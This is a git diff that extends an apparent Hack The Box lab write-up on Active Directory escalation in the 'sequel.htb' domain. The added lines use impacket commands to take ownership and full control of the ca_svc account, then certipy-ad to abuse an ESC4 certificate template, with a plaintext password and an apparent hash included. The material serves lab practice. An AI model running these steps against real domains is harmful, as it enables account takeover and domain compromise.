@@ -70,4 +70,14 @@ we run:
 bloodhound -u ryan -p "XXXXXXXXXXX" -d sequel.htb -ns 10.10.11.51 -c All
 after collecting info, start bloodhound, search for Ryan Node and mark it as owned e click on transitive object control query to find it can writeOwner on ca_svc (responsibale for certificate)
 
+using bloodhound suggestions we become owner of ca_svc:
+
+`impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'dc01.sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'`
+`impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc dc01.sequel.htb/ryan:WqSZAF6CysDQbGb3`
+
 so then with it, you seach fo vulnerable certificates with certipy-ad find and it finds ESC4 vulnerable template
+
+KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
+
+
+:3b181b914e7a9d5508ea1e20bc2b7fce
